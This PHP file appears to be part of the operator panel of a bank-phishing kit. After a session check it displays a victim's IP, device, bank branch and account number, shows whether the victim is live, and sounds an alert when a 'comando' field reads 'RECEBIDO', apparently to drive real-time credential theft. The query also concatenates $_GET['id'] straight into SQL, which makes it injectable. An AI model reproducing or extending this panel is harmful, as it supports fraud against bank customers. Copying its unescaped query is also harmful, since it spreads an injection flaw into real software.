<?php
require_once('../function.php');
require_once('../conexao.php');

if (!isset($_SESSION['nome_usu_sessao'])) :
    $_SESSION['msg'] = "<div class='alert alert-danger icons-alert'>
    <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
    <i class='icofont icofont-close-line-circled'></i>
    </button>
    <p><strong>Erro!</strong> Você precisa autenticar primeiro para ver esta pagina.</p>
    </div>";
    header("Location: ./login.php");
    exit();
endif;

mysqli_select_db($ConnectDB, $database_ConnectDB);
$query_Cliente = sprintf("SELECT * FROM infos WHERE id = '" . $_GET['id'] . "'");
$Cliente = mysqli_query($ConnectDB, $query_Cliente);
$row_Cliente = mysqli_fetch_assoc($Cliente);
$totalRows_Cliente = mysqli_num_rows($Cliente);

///////////////////

$id_client = $row_Cliente['agencia'];
//Obter a data atual
$data['atual'] = date('Y-m-d H:i:s');

//Diminuir 20 segundos 
$data['online'] = strtotime($data['atual'] . " - 5 seconds");
$data['online'] = date("Y-m-d H:i:s", $data['online']);

//Pesquisar os ultimos usuarios online nos 20 segundo
$result_qnt_visitas = "SELECT count(id) as online FROM visitas WHERE data_final >= '" . $data['online'] . "' and client_id='$id_client'";

$resultado_qnt_visitas = mysqli_query($ConnectDB, $result_qnt_visitas);
$row_qnt_visitas = mysqli_fetch_assoc($resultado_qnt_visitas);
$row_qnt_visitas['online'];

if ($row_qnt_visitas['online'] == '1') {
    //echo '<span class="label label-success font-weight-bold label-inline" >Online</span>';

    $verifica_online = 'online';
} else {
    //echo '<span class="label label-danger font-weight-bold label-inline">Offline</span>';

    $verifica_online = 'offline';
}

if ($verifica_online == 'online') {

    if (strpos($row_Cliente["comando"], 'RECEBIDO') !== false) {
        echo '<audio id="audio" autoplay>
                <source src="./iphone_sound.mp3" type="audio/mp3" />
                </audio>';
    }
}

if ($row_Cliente['variacao'] == 'varejo') {
    $row_Cliente['variacao'] = 'classic';
    # code...
}
?>

<td scope="row"><span class="id"><?php print $row_Cliente['id']; ?></span></td>
<td><span class="ip"><?php print $row_Cliente['ip']; ?></span></td>
<td><span class="data"><?php print $row_Cliente['datahora']; ?></span></td>
<td><span class="device" style="text-transform: uppercase;"><?php print $row_Cliente['dispositivo']; ?></span></td>
<td><span class="agencia"><?php print $row_Cliente['agencia']; ?></span></td>
<td><span class="conta"><?php print $row_Cliente['conta']; ?></span></td>
<td><span class="tipo" style="text-transform: uppercase;"><?php print $row_Cliente['variacao']; ?></span></td>
<td><span class="status <?php print $verifica_online; ?>" style="text-transform: uppercase;"><?php print $verifica_online; ?></span></td>
<td><span class="comando" style="text-transform: uppercase;"><?php print $row_Cliente['comando']; ?></span></td>